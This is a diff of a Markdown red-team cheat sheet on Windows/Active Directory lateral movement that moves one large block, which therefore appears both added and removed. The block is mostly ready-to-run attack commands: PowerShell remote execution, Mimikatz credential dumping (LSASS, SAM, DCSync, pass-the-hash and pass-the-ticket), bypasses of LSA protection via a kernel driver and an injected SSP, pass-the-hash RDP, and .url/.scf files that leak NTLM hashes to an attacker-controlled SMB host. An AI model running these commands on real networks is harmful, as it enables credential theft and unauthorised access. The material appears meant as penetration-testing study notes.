@@ -72,6 +72,250 @@ This document covers techniques for moving laterally across Windows/AD environme
 
 ---
 
+### PowerShell Remoting
+
+```powershell
+#Enable PowerShell Remoting on current Machine (Needs Admin Access)
+Enable-PSRemoting
+
+#Entering or Starting a new PSSession (Needs Admin Access)
+$sess = New-PSSession -ComputerName <Name>
+Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
+```
+- **What:** PowerShell Remoting uses WinRM (TCP 5985/5986) to execute commands on remote systems.
+- **Requirements:** Local admin on target, WinRM enabled, network connectivity.
+- **Why:** Stealthier than RDP; leverages legitimate Windows management protocols.
+
+### Remote Code Execution with PS Credentials
+
+```powershell
+$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
+Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
+```
+- **What:** Execute commands remotely using explicit credentials (plaintext password).
+- **Use case:** When you have credentials but aren't running in that user's context.
+- **Note:** Commands run in a new process on the remote machine and return output locally.
+
+### Import a PowerShell Module and Execute its Functions Remotely
+
+```powershell
+#Execute the command and start a session
+Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
+
+#Interact with the session
+Enter-PSSession -Session $sess
+
+```
+- **What:** Load and execute a local PowerShell script on a remote machine via an existing session.
+- **Use case:** Running tools (PowerView, Mimikatz, etc.) remotely without dropping files to disk.
+- **Why:** Enables "fileless" execution on the target.
+
+### Executing Remote Stateful commands
+
+```powershell
+#Create a new session
+$sess = New-PSSession -ComputerName <NameOfComputer>
+
+#Execute command on the session
+Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
+
+#Check the result of the command to confirm we have an interactive session
+Invoke-Command -Session $sess -ScriptBlock {$ps}
+```
+- **What:** Persistent session that maintains state (variables, objects) across multiple commands.
+- **Use case:** Multi-step operations where you need to reference previous command results.
+- **Why:** More efficient than creating new sessions for each command; reduces authentication overhead.
+
+### Mimikatz
+
+**What is Mimikatz:** Post-exploitation tool for extracting credentials from memory, performing pass-the-hash/ticket attacks, and manipulating Windows authentication.
+
+```powershell
+#The commands are in cobalt strike format!
+
+#Dump LSASS (Local Security Authority Subsystem Service):
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz sekurlsa::logonpasswords
+
+#(Over) Pass The Hash - authenticate using NTLM hash without plaintext password
+mimikatz privilege::debug
+mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
+
+#List all available kerberos tickets in memory
+mimikatz sekurlsa::tickets
+
+#Dump local Terminal Services credentials (RDP saved credentials)
+mimikatz sekurlsa::tspkg
+
+#Dump and save LSASS in a file (for offline analysis)
+mimikatz sekurlsa::minidump c:\temp\lsass.dmp
+
+#List cached MasterKeys (used for DPAPI decryption)
+mimikatz sekurlsa::dpapi
+
+#List local Kerberos AES Keys (for Kerberos encryption)
+mimikatz sekurlsa::ekeys
+
+#Dump SAM Database (local user hashes)
+mimikatz lsadump::sam
+
+#Dump SECRETS Database (service account passwords, cached domain credentials)
+mimikatz lsadump::secrets
+
+#Inject and dump the Domain Controller's Credentials (requires DC access)
+mimikatz privilege::debug
+mimikatz token::elevate
+mimikatz lsadump::lsa /inject
+
+#DCSync - Dump domain credentials by impersonating a DC (requires Replicating Directory Changes rights)
+mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
+
+#Dump password history of a specific user
+mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
+
+#List and Dump local kerberos tickets from memory
+mimikatz kerberos::list /dump
+
+#Pass The Ticket - inject a Kerberos ticket (.kirbi) into current session
+mimikatz kerberos::ptt <PathToKirbiFile>
+
+#List Terminal Services / RDP sessions on the machine
+mimikatz ts::sessions
+
+#List Windows Vault credentials (saved passwords in Credential Manager)
+mimikatz vault::list
+```
+- **Note:** Requires local admin or SYSTEM privileges for most operations. Some commands (DCSync) require specific AD permissions.
+
+:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?
+
+- LSA as a Protected Process (Kernel Land Bypass)
+
+  ```powershell
+  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
+  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
+
+  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
+  #Now lets import the mimidriver.sys to the system
+  mimikatz # !+
+
+  #Now lets remove the protection flags from lsass.exe process
+  mimikatz # !processprotect /process:lsass.exe /remove
+
+  #Finally run the logonpasswords function to dump lsass
+  mimikatz # sekurlsa::logonpasswords
+  ```
+
+- LSA as a Protected Process (Userland "Fileless" Bypass)
+
+  - [PPLdump](https://github.com/itm4n/PPLdump)
+  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
+
+- LSA is running as virtualized process (LSAISO) by Credential Guard
+
+  ```powershell
+  #Check if a process called lsaiso.exe exists on the running processes
+  tasklist |findstr lsaiso
+
+  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
+  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
+  mimikatz # misc::memssp
+
+  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
+  ```
+
+- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
+- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
+
+### Remote Desktop Protocol
+
+**What:** RDP (port 3389) provides graphical remote desktop access. With RestrictedAdmin mode, you can authenticate using NTLM hash instead of plaintext password.
+
+**RestrictedAdmin Mode:** When enabled, credentials aren't sent to the remote host (preventing credential theft), but allows pass-the-hash attacks.
+
+- Mimikatz:
+
+  ```powershell
+  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
+  privilege::debug
+  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
+
+  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
+  ```
+
+- xFreeRDP:
+
+```powershell
+xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
+```
+  - **What:** Linux-based RDP client supporting pass-the-hash authentication.
+
+:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
+
+- Bypass "Single Session per User" Restriction
+
+**What:** By default, Windows allows only one RDP session per user. This registry modification allows multiple concurrent sessions.
+
+On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
+```powershell
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
+```
+
+Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
+```powershell
+REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
+```
+- **Use case:** Establish RDP without kicking off the legitimate user (reduces detection risk).
+
+
+### URL File Attacks
+
+**What:** Malicious shortcut files that force Windows to authenticate to an attacker-controlled SMB server, leaking NTLM hashes when the file is viewed (not clicked).
+
+**How it works:** When Windows Explorer renders the icon, it attempts to load it from the UNC path, sending NTLMv2 authentication.
+
+- .url file
+
+  ```
+  [InternetShortcut]
+  URL=whatever
+  WorkingDirectory=whatever
+  IconFile=\\<AttackersIp>\%USERNAME%.icon
+  IconIndex=1
+  ```
+
+  ```
+  [InternetShortcut]
+  URL=file://<AttackersIp>/leak/leak.html
+  ```
+
+- .scf file
+
+  ```
+  [Shell]
+  Command=2
+  IconFile=\\<AttackersIp>\Share\test.ico
+  [Taskbar]
+  Command=ToggleDesktop
+  ```
+
+Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use Responder or Inveigh to capture the hashes.
+
+- **Capture hashes:** Run `responder -I <interface> -v` on the attacker machine to capture and relay NTLMv2 hashes.
+- **Use case:** Phishing via file shares, gaining initial credentials for password cracking or relay attacks.
+
+:exclamation: .scf file attacks won't work on the latest versions of Windows.
+
+### Useful Tools
+
+- [Powercat](https://github.com/besimorhino/powercat) — PowerShell version of netcat with tunneling, relay, and port forwarding
+- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) — Fileless lateral movement via ChangeServiceConfigA API
+- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) — Feature-rich WinRM shell for pentesting (supports upload/download, DLL injection)
+- [RunasCs](https://github.com/antonioCoco/RunasCs) — C# implementation of runas.exe with more features and OPSEC improvements
+- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) — Generates all file types for NTLM hash theft attacks (.url, .lnk, .scf, etc.)
+
 ## Skills to Develop
 
 ### Technical Skills
@@ -374,247 +618,3 @@ This document covers techniques for moving laterally across Windows/AD environme
 - **Disable Services:** Disable WMI, WinRM where not needed
 
 ---
-
-### PowerShell Remoting
-
-```powershell
-#Enable PowerShell Remoting on current Machine (Needs Admin Access)
-Enable-PSRemoting
-
-#Entering or Starting a new PSSession (Needs Admin Access)
-$sess = New-PSSession -ComputerName <Name>
-Enter-PSSession -ComputerName <Name> OR -Sessions <SessionName>
-```
-- **What:** PowerShell Remoting uses WinRM (TCP 5985/5986) to execute commands on remote systems.
-- **Requirements:** Local admin on target, WinRM enabled, network connectivity.
-- **Why:** Stealthier than RDP; leverages legitimate Windows management protocols.
-
-### Remote Code Execution with PS Credentials
-
-```powershell
-$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
-$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
-Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
-```
-- **What:** Execute commands remotely using explicit credentials (plaintext password).
-- **Use case:** When you have credentials but aren't running in that user's context.
-- **Note:** Commands run in a new process on the remote machine and return output locally.
-
-### Import a PowerShell Module and Execute its Functions Remotely
-
-```powershell
-#Execute the command and start a session
-Invoke-Command -Credential $cred -ComputerName <NameOfComputer> -FilePath c:\FilePath\file.ps1 -Session $sess
-
-#Interact with the session
-Enter-PSSession -Session $sess
-
-```
-- **What:** Load and execute a local PowerShell script on a remote machine via an existing session.
-- **Use case:** Running tools (PowerView, Mimikatz, etc.) remotely without dropping files to disk.
-- **Why:** Enables "fileless" execution on the target.
-
-### Executing Remote Stateful commands
-
-```powershell
-#Create a new session
-$sess = New-PSSession -ComputerName <NameOfComputer>
-
-#Execute command on the session
-Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}
-
-#Check the result of the command to confirm we have an interactive session
-Invoke-Command -Session $sess -ScriptBlock {$ps}
-```
-- **What:** Persistent session that maintains state (variables, objects) across multiple commands.
-- **Use case:** Multi-step operations where you need to reference previous command results.
-- **Why:** More efficient than creating new sessions for each command; reduces authentication overhead.
-
-### Mimikatz
-
-**What is Mimikatz:** Post-exploitation tool for extracting credentials from memory, performing pass-the-hash/ticket attacks, and manipulating Windows authentication.
-
-```powershell
-#The commands are in cobalt strike format!
-
-#Dump LSASS (Local Security Authority Subsystem Service):
-mimikatz privilege::debug
-mimikatz token::elevate
-mimikatz sekurlsa::logonpasswords
-
-#(Over) Pass The Hash - authenticate using NTLM hash without plaintext password
-mimikatz privilege::debug
-mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>
-
-#List all available kerberos tickets in memory
-mimikatz sekurlsa::tickets
-
-#Dump local Terminal Services credentials (RDP saved credentials)
-mimikatz sekurlsa::tspkg
-
-#Dump and save LSASS in a file (for offline analysis)
-mimikatz sekurlsa::minidump c:\temp\lsass.dmp
-
-#List cached MasterKeys (used for DPAPI decryption)
-mimikatz sekurlsa::dpapi
-
-#List local Kerberos AES Keys (for Kerberos encryption)
-mimikatz sekurlsa::ekeys
-
-#Dump SAM Database (local user hashes)
-mimikatz lsadump::sam
-
-#Dump SECRETS Database (service account passwords, cached domain credentials)
-mimikatz lsadump::secrets
-
-#Inject and dump the Domain Controller's Credentials (requires DC access)
-mimikatz privilege::debug
-mimikatz token::elevate
-mimikatz lsadump::lsa /inject
-
-#DCSync - Dump domain credentials by impersonating a DC (requires Replicating Directory Changes rights)
-mimikatz lsadump::dcsync /domain:<DomainFQDN> /all
-
-#Dump password history of a specific user
-mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history
-
-#List and Dump local kerberos tickets from memory
-mimikatz kerberos::list /dump
-
-#Pass The Ticket - inject a Kerberos ticket (.kirbi) into current session
-mimikatz kerberos::ptt <PathToKirbiFile>
-
-#List Terminal Services / RDP sessions on the machine
-mimikatz ts::sessions
-
-#List Windows Vault credentials (saved passwords in Credential Manager)
-mimikatz vault::list
-```
-- **Note:** Requires local admin or SYSTEM privileges for most operations. Some commands (DCSync) require specific AD permissions.
-
-:exclamation: What if mimikatz fails to dump credentials because of LSA Protection controls ?
-
-- LSA as a Protected Process (Kernel Land Bypass)
-
-  ```powershell
-  #Check if LSA runs as a protected process by looking if the variable "RunAsPPL" is set to 0x1
-  reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa
-
-  #Next upload the mimidriver.sys from the official mimikatz repo to same folder of your mimikatz.exe
-  #Now lets import the mimidriver.sys to the system
-  mimikatz # !+
-
-  #Now lets remove the protection flags from lsass.exe process
-  mimikatz # !processprotect /process:lsass.exe /remove
-
-  #Finally run the logonpasswords function to dump lsass
-  mimikatz # sekurlsa::logonpasswords
-  ```
-
-- LSA as a Protected Process (Userland "Fileless" Bypass)
-
-  - [PPLdump](https://github.com/itm4n/PPLdump)
-  - [Bypassing LSA Protection in Userland](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland)
-
-- LSA is running as virtualized process (LSAISO) by Credential Guard
-
-  ```powershell
-  #Check if a process called lsaiso.exe exists on the running processes
-  tasklist |findstr lsaiso
-
-  #If it does there isn't a way tou dump lsass, we will only get encrypted data. But we can still use keyloggers or clipboard dumpers to capture data.
-  #Lets inject our own malicious Security Support Provider into memory, for this example i'll use the one mimikatz provides
-  mimikatz # misc::memssp
-
-  #Now every user session and authentication into this machine will get logged and plaintext credentials will get captured and dumped into c:\windows\system32\mimilsa.log
-  ```
-
-- [Detailed Mimikatz Guide](https://adsecurity.org/?page_id=1821)
-- [Poking Around With 2 lsass Protection Options](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
-
-### Remote Desktop Protocol
-
-**What:** RDP (port 3389) provides graphical remote desktop access. With RestrictedAdmin mode, you can authenticate using NTLM hash instead of plaintext password.
-
-**RestrictedAdmin Mode:** When enabled, credentials aren't sent to the remote host (preventing credential theft), but allows pass-the-hash attacks.
-
-- Mimikatz:
-
-  ```powershell
-  #We execute pass-the-hash using mimikatz and spawn an instance of mstsc.exe with the "/restrictedadmin" flag
-  privilege::debug
-  sekurlsa::pth /user:<Username> /domain:<DomainName> /ntlm:<NTLMHash> /run:"mstsc.exe /restrictedadmin"
-
-  #Then just click ok on the RDP dialogue and enjoy an interactive session as the user we impersonated
-  ```
-
-- xFreeRDP:
-
-```powershell
-xfreerdp  +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8  /u:<Username> /pth:<NTLMHash> /v:<Hostname | IPAddress>
-```
-  - **What:** Linux-based RDP client supporting pass-the-hash authentication.
-
-:exclamation: If Restricted Admin mode is disabled on the remote machine we can connect on the host using another tool/protocol like psexec or winrm and enable it by creating the following registry key and setting it's value zero: "HKLM:\System\CurrentControlSet\Control\Lsa\DisableRestrictedAdmin".
-
-- Bypass "Single Session per User" Restriction
-
-**What:** By default, Windows allows only one RDP session per user. This registry modification allows multiple concurrent sessions.
-
-On a domain computer, if you have command execution as the system or local administrator and want an RDP session that another user is already using, you can get around the single session restriction by adding the following registry key:
-```powershell
-REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
-```
-
-Once you've completed the desired stuff, you can delete the key to reinstate the single-session-per-user restriction.
-```powershell
-REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUse
-```
-- **Use case:** Establish RDP without kicking off the legitimate user (reduces detection risk).
-
-
-### URL File Attacks
-
-**What:** Malicious shortcut files that force Windows to authenticate to an attacker-controlled SMB server, leaking NTLM hashes when the file is viewed (not clicked).
-
-**How it works:** When Windows Explorer renders the icon, it attempts to load it from the UNC path, sending NTLMv2 authentication.
-
-- .url file
-
-  ```
-  [InternetShortcut]
-  URL=whatever
-  WorkingDirectory=whatever
-  IconFile=\\<AttackersIp>\%USERNAME%.icon
-  IconIndex=1
-  ```
-
-  ```
-  [InternetShortcut]
-  URL=file://<AttackersIp>/leak/leak.html
-  ```
-
-- .scf file
-
-  ```
-  [Shell]
-  Command=2
-  IconFile=\\<AttackersIp>\Share\test.ico
-  [Taskbar]
-  Command=ToggleDesktop
-  ```
-
-Putting these files in a writeable share the victim only has to open the file explorer and navigate to the share. **Note** that the file doesn't need to be opened or the user to interact with it, but it must be on the top of the file system or just visible in the windows explorer window in order to be rendered. Use Responder or Inveigh to capture the hashes.
-
-- **Capture hashes:** Run `responder -I <interface> -v` on the attacker machine to capture and relay NTLMv2 hashes.
-- **Use case:** Phishing via file shares, gaining initial credentials for password cracking or relay attacks.
-
-:exclamation: .scf file attacks won't work on the latest versions of Windows.
-
-### Useful Tools
-
-- [Powercat](https://github.com/besimorhino/powercat) — PowerShell version of netcat with tunneling, relay, and port forwarding
-- [SCShell](https://github.com/Mr-Un1k0d3r/SCShell) — Fileless lateral movement via ChangeServiceConfigA API
-- [Evil-Winrm](https://github.com/Hackplayers/evil-winrm) — Feature-rich WinRM shell for pentesting (supports upload/download, DLL injection)
-- [RunasCs](https://github.com/antonioCoco/RunasCs) — C# implementation of runas.exe with more features and OPSEC improvements
-- [ntlm_theft](https://github.com/Greenwolf/ntlm_theft.git) — Generates all file types for NTLM hash theft attacks (.url, .lnk, .scf, etc.)
